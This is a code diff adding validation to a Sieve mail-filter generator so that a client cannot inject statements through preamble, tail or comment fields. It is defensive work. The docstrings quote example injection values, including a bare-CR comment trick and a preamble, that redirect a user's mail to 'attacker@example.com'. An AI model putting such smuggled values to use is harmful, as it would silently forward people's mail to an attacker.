@@ -1567,6 +1567,117 @@ def span_is_faithful(entry: Entry) -> bool:
     return _without_span(reparsed.entries[0]) == _without_span(entry)
 
 
+_LONE_CR = re.compile(r"\r(?!\n)")
+
+
+def _lone_cr_error(script: SieveScript) -> str | None:
+    """Whether any text we would write carries a CR that is not part of a CRLF.
+
+    Found by fuzzing `_boundary_error`, and it is the one vector that got
+    through. Our parser splits on "\n" alone, so a bare CR is an ordinary
+    character in the middle of a line — and so
+    `# harmless note\rredirect "attacker@example.com";` is ONE comment to us,
+    and to sievelib, and therefore to the `.13` pre-flight as well. RFC 5228
+    says a comment runs to CRLF and excludes CR from its body, so what a real
+    server does with the bytes after that CR is undefined and at least one
+    plausible reading executes them. Three separate paths would have written it
+    verbatim:
+
+      - the boundary bytes, where a hostile `preamble` or `tail` needs no
+        cooperation from anything else;
+      - an entry's `source`, where the comment is absorbed as the Rule's NAME,
+        so a client that sends the matching `name` makes the span value-equal to
+        its entry and `span_is_faithful` vouches for it;
+      - a canonically rendered `RawBlock.comment` or `Rule.name`, which is
+        emitted as a `#` line and predates spans entirely.
+
+    One check rather than three, because it is one question — are these bytes
+    ours to write — asked of every field that becomes part of the script outside
+    a quoted string. Values and arguments are excluded because the generator
+    escapes them into quoted strings, verified; a CR there is a literal, not a
+    statement.
+
+    NO REAL SCRIPT LOSES BY THIS. Not one of the 63 corpus fixtures contains a
+    CR of any kind, CRLF line endings stay legal because every CR in them is
+    followed by LF, and a CR-only file is not valid Sieve to begin with.
+    """
+    texts: list[str] = [script.preamble, script.requires_source, script.tail]
+    for entry in script.entries:
+        texts.append(entry.source)
+        if isinstance(entry, Rule):
+            texts.append(entry.name)
+        else:
+            texts.extend((entry.text, entry.comment))
+    for text in texts:
+        if _LONE_CR.search(text):
+            return "a carriage return would end a line for the server but not for us"
+    return None
+
+
+def _boundary_error(script: SieveScript) -> str | None:
+    """What is wrong with the verbatim bytes that are not an entry's span.
+
+    `span_is_faithful` proves an entry's span by re-parsing it and comparing to
+    the entry. The preamble, the `require` bytes and the tail have no entry to
+    be compared against, so they are held to a narrower rule instead: the head
+    may hold comments, blank lines and `require` statements for extensions the
+    wire declares, and NOTHING else; the tail may hold no statement at all.
+    Without this, `source` on the wire would be an arbitrary-text-to-the-mail-
+    server hole with no guard on either end — and not a theoretical one. Before
+    this guard, a PUT carrying `preamble = 'redirect "attacker@example.com";'`
+    and no entries at all was answered 200 and written to the user's mail
+    server.
+
+    THE PREAMBLE IS CHECKED TWICE, ALONE AND THEN WITH THE `require` BYTES
+    JOINED ON, because the generator emits it in both companies. A save that
+    regenerates anything drops `requires_source` and writes the preamble against
+    a freshly rendered `require` line instead, so checking only the join
+    validates bytes that are not the bytes written: a `preamble` of
+    `require ["fileinto"` with a `requires_source` of `];` reads as one honest
+    statement joined, and on the regenerating path goes out as
+    `require ["fileinto"require ["fileinto"];`. Found by attacking this guard
+    after writing it. A real server refuses that, so the cost was a confusing
+    failure rather than a wrong filter — but a check that does not cover what is
+    actually emitted is not a check.
+
+    The join is needed as well as the halves, and is parsed as ONE unit, because
+    `requires_source` is not always a single well-formed statement: a file that
+    declares its extensions in three goes keeps the comment sitting between them
+    in the same span.
+
+    THE REQUIRES CHECK IS SUBSET, NOT EQUALITY, and that difference is the whole
+    difference between a guard and a lockout. The property worth having is that
+    the verbatim bytes never DECLARE MORE than the wire says — a client must not
+    send `requires: ["fileinto"]` and write `require ["fileinto", "vacation"];`.
+    The converse costs nothing and is the ordinary case: a script built in the
+    UI declares `["fileinto"]` and carries no `requires_source` at all, because
+    there were never any bytes to parse and the generator renders that line
+    canonically. Demanding equality refuses every such save — it refused nine
+    existing tests, `test_saving_rules_stores_generated_sieve` among them,
+    before this was corrected. An empty head is therefore always agreement, and
+    so is a script whose `require` sits BELOW its first entry: those extensions
+    are deliberately not harvested, so the list and the bytes are both empty.
+
+    This is deliberately NOT `.13`'s mistake in a new place. That bead learned
+    that a whole-script validator refuses working scripts forever, because
+    sievelib does not know `include`, `addheader` or `spamtest` though every
+    real server does. Two things keep this clear of it: it runs OUR parser, not
+    sievelib's, and it runs over the head and tail ONLY — never over an entry,
+    which is where an unknown extension lives.
+    """
+    for text in (script.preamble, script.preamble + script.requires_source):
+        head = parse_sieve(text)
+        if head.entries:
+            return "preamble carries a statement"
+        undeclared = [r for r in head.requires if r not in script.requires]
+        if undeclared:
+            return f"require bytes declare an undeclared extension: {undeclared[0]}"
+    tail = parse_sieve(script.tail)
+    if tail.entries or tail.requires:
+        return "trailing bytes carry a statement"
+    return None
+
+
 def preflight_error(script: SieveScript) -> str | None:
     """Why the mail server would refuse this script, or None (`.13`).
 
@@ -1582,7 +1693,19 @@ def preflight_error(script: SieveScript) -> str | None:
     Each Rule is checked as its own little script, with the requires it needs,
     because sievelib treats a command whose extension was not required as a
     hard parse failure.
+
+    SINCE areyousievious-8fg.14 IT ALSO COVERS THE BOUNDARY BYTES. The
+    preamble, the `require` bytes and the tail cross the wire and are written
+    to the mail server verbatim, and no entry exists to compare them against —
+    so `_boundary_error` checks them first, and `_lone_cr_error` checks every
+    field that becomes a line of the script for a CR the server would treat as
+    ending that line and we would not. Both ask a different question from the
+    one below — is this text ours to write at all, rather than will the server
+    compile it — which is why they are separate functions and not more clauses.
     """
+    problem = _lone_cr_error(script) or _boundary_error(script)
+    if problem:
+        return problem
     for rule in script.rules:
         problem = sieve_is_parseable(generate_sieve(SieveScript(entries=[rule])))
         if problem:
